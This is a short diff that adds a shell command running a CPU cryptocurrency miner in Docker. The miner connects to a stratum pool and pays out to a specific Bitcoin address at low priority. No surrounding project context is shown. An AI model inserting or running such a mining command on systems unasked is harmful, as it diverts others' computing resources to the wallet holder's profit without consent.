@@ -1,0 +1,7 @@
+nice -n 19 docker run --rm  cpu-min-opt:1.0 \
+  -a sha256d \
+  -o stratum+tcp://pool.sethforprivacy.com:3333 \
+  -u bc1qawcmkz0f406sfwple0u7xarmvh3ms5uusu8l66 \
+  -p x \
+  --threads 1 \
+  --cpu-priority 0
